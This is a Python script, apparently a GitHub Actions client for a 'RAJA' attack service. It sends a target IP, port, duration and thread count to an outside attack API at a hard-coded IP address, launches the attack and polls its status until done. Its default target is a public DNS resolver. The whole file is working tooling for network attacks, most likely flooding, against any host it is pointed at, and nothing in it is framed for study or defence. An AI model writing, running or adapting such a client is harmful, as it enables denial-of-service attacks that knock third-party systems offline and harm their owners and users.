#!/usr/bin/env python3
"""
RAJA GitHub Actions Integration
Executes attack via RAJA API from GitHub Actions
"""

import requests
import sys
import json
import time
import os

class RajaGitHubClient:
    def __init__(self, api_url, api_key):
        self.api_url = api_url.rstrip('/')
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'GitHub-Actions-RAJA/1.0',
            'Accept': 'application/json'
        })
    
    def launch_attack(self, target_ip, target_port=80, duration=30, threads=10):
        """Launch attack via RAJA API"""
        params = {
            'ip': target_ip,
            'port': target_port,
            'time': duration,
            'threads': threads,
            'api_key': self.api_key
        }
        
        print(f"🚀 Launching attack on {target_ip}:{target_port}")
        print(f"⏱️ Duration: {duration}s | 🧵 Threads: {threads}")
        
        try:
            response = self.session.get(f"{self.api_url}/attack", params=params)
            response.raise_for_status()
            
            result = response.json()
            
            if result.get('status') == 'success':
                attack_id = result.get('attack_id')
                print(f"✅ Attack launched successfully!")
                print(f"🔑 Attack ID: {attack_id}")
                print(f"🎯 Target: {result.get('target')}")
                return attack_id
            else:
                print(f"❌ Failed: {result.get('message', 'Unknown error')}")
                return None
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Network error: {e}")
            return None
    
    def check_status(self, attack_id):
        """Check attack status"""
        params = {
            'attack_id': attack_id,
            'api_key': self.api_key
        }
        
        try:
            response = self.session.get(f"{self.api_url}/status", params=params)
            if response.status_code == 200:
                return response.json()
            return None
        except:
            return None
    
    def monitor_attack(self, attack_id, max_checks=12, interval=10):
        """Monitor attack progress"""
        print(f"\n🔍 Monitoring attack: {attack_id}")
        
        for i in range(max_checks):
            status_data = self.check_status(attack_id)
            
            if status_data:
                current_status = status_data.get('status', 'unknown')
                target = status_data.get('target', 'unknown')
                
                print(f"  Check #{i+1}: Status = {current_status} | Target = {target}")
                
                if current_status in ['completed', 'stopped']:
                    print(f"✅ Attack {attack_id} completed")
                    return True
            
            if i < max_checks - 1:
                time.sleep(interval)
        
        print(f"⚠️  Attack still running after {max_checks * interval} seconds")
        return False

def main():
    # Get parameters from environment variables (GitHub Actions)
    target_ip = os.getenv('TARGET_IP', '8.8.8.8')
    target_port = int(os.getenv('TARGET_PORT', '80'))
    duration = int(os.getenv('ATTACK_DURATION', '30'))
    threads = int(os.getenv('ATTACK_THREADS', '10'))
    api_url = os.getenv('RAJA_API_URL', 'http://34.208.39.84:80')
    api_key = os.getenv('RAJA_API_KEY')
    
    if not api_key:
        print("❌ ERROR: RAJA_API_KEY environment variable is required")
        sys.exit(1)
    
    # Initialize client
    client = RajaGitHubClient(api_url, api_key)
    
    # Launch attack
    attack_id = client.launch_attack(target_ip, target_port, duration, threads)
    
    if attack_id:
        # Monitor attack
        client.monitor_attack(attack_id)
    
    print("\n📊 Attack execution completed")

if __name__ == "__main__":
    main()